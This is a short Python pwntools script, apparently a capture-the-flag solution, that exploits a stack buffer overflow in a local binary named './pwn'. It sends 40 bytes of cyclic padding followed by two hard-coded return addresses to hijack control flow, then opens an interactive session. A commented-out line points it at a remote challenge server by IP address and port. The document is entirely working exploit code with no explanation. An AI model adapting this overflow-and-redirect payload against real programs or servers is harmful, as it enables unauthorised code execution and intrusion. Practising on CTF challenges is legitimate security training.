from pwn import *

elf = context.binary = ELF('./pwn')

p = process()
#p = remote('209.97.134.50',32698)
offset = 40

#print(pack(0x00000000004005f7))
payload = cyclic(offset) + pack(0x00000000004004ce) + pack(0x00000000004005f7)

p.sendline(payload)
p.interactive()
